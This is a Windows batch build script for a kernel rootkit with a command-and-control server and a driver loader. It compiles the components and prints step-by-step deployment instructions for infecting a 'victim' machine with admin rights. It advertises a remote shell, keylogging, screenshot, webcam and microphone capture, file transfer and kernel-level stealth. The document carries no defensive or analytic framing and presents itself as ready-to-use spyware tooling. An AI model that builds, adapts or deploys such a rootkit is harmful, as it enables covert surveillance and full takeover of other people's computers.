@echo off
echo Building Zeta Rootkit C&C System v4.0... 🚀

echo Compiling Rootkit Driver...
cl /nologo /kernel zeta_rootkit_comm.c /link /nologo /driver /out:zeta.sys

echo Compiling C2 Server...
gcc -o c2_server.exe c2_server.c -lws2_32

echo Compiling Driver Loader...
gcc -o load_driver.exe load_driver.c

echo.
echo === C&C SYSTEM READY ===
echo.
echo FILES:
echo - zeta.sys       (Rootkit driver with C&C)
echo - c2_server.exe  (Attacker C2 server) 
echo - load_driver.exe (Rootkit loader)
echo.
echo DEPLOYMENT:
echo 1. Edit C2_SERVER IP in zeta_rootkit_comm.c to YOUR IP
echo 2. Run c2_server.exe on YOUR machine
echo 3. Deploy zeta.sys + load_driver.exe to victim
echo 4. Run load_driver.exe as ADMIN on victim
echo.
echo FEATURES:
echo - Interactive shell
echo - Keylogging
echo - Screenshot capture
echo - Webcam access
echo - Microphone recording
echo - File transfer
echo - Kernel-level stealth
echo - Total fucking control! 💀
echo.
pause